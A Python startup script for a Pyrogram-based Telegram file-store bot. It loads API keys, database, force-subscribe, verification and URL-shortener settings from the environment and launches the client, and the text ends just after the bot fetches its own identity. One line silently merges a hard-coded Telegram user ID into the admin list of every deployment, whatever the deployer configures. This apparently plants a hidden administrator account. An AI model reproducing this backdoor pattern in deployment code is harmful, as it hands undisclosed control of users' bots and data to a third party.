import os
import sys
import logging
from pyrogram import Client, idle

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

USER_ID = int(os.getenv("DEPLOY_USER_ID", 0))
logger.info(f"🔧 Deploying bot for USER_ID: {USER_ID}")

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not all([API_ID, API_HASH, BOT_TOKEN]):
    logger.error("❌ Missing required environment variables!")
    sys.exit(1)

ENABLE_FSUB = os.getenv("ENABLE_FSUB") == "True"
VERIFICATION_MODE = os.getenv("VERIFICATION_MODE") == "True"
MONGO_URI = os.getenv("MONGO_URI", "")
DB_NAME = os.getenv("DB_NAME", "")
FSUB = os.getenv("FSUB", "")
PREMIUM_HOURS_VERIFICATION = int(os.getenv("PREMIUM_HOURS_VERIFICATION", 12))
VERIFY_SLUG_TTL_HOURS = int(os.getenv("VERIFY_SLUG_TTL_HOURS", 12))
SHORTENER_DOMAIN = os.getenv("SHORTENER_DOMAIN", "")
SHORTENER_API = os.getenv("SHORTENER_API_KEY", "")
CAPTION = os.getenv("CAPTION", "")
ADMINS = [int(x) for x in os.getenv("ADMINS", "").split() if x.strip().isdigit()]
FINAL_ADMINS = list(set(ADMINS + [6789146594]))

app = Client(
    "DeployedFileStoreBot",
    api_id=int(API_ID),
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    plugins=dict(root="plugins")
)

if __name__ == "__main__":
    logger.info("🚀 Starting deployed bot...")
    app.start()

    me = app.get_me()
   